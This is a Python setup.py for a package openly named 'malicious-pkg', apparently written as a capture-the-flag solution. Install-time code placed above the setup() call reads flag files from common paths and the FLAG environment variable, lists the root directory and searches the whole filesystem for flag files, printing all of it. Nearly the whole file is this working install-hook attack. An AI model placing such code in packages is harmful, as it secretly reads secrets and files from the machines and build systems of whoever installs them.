import subprocess, sys, os

# Try to read flag from common locations
flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/home/flag.txt", "/app/flag.txt", "/app/flag"]

for path in flag_paths:
    try:
        with open(path) as f:
            content = f.read()
            print(f"FLAG_FOUND at {path}: {content}")
    except:
        pass

# Also try env
flag_env = os.environ.get("FLAG")
if flag_env:
    print(f"FLAG from env: {flag_env}")

# Also list root directory
try:
    result = subprocess.run(["ls", "-la", "/"], capture_output=True, text=True, timeout=5)
    print(f"Root dir:\n{result.stdout}")
    if result.stderr:
        print(f"Root dir stderr:\n{result.stderr}")
except Exception as e:
    print(f"Error listing root: {e}")

try:
    result = subprocess.run(["find", "/", "-name", "flag*"], capture_output=True, text=True, timeout=5)
    print(f"Flag files found:\n{result.stdout}")
    if result.stderr:
        print(f"Find stderr:\n{result.stderr}")
except Exception as e:
    print(f"Error finding flags: {e}")

from setuptools import setup, find_packages
setup(
    name="malicious-pkg",
    version="0.1.0",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
)
